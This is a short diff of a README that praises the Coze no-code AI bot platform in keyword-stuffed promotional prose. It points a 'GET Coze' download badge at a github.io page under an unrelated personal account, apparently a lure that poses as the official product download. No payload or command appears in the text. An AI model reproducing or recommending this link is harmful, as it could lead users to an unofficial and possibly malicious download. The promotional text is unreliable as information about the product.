@@ -4,7 +4,7 @@
 
 Coze is an innovative AI bot platform designed to build, deploy, and manage intelligent agents without writing a single line of code. Coze simplifies the creation of automation workflows, allowing users to focus on logic rather than infrastructure. With its intuitive visual interface, Coze makes AI accessible to everyone, from beginners to experienced developers. The Coze platform supports a wide range of plugins and integrations, enabling complex tasks to be automated seamlessly. Coze stands out in the market due to its rapid development cycle and user-centric design. Many users prefer Coze for its reliability and the ease with which Coze handles data processing and user interaction. Coze continues to evolve based on community feedback, ensuring that Coze remains at the forefront of no-code AI solutions.
 
-[![GET Coze](https://img.shields.io/badge/GET%20%E2%80%94%20Coze-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Coze](https://img.shields.io/badge/GET%20%E2%80%94%20Coze-0078D6?style=for-the-badge&logoColor=white)](https://lauramartinezp957.github.io/.github/coze-ai-assistant)
 
 ---
 
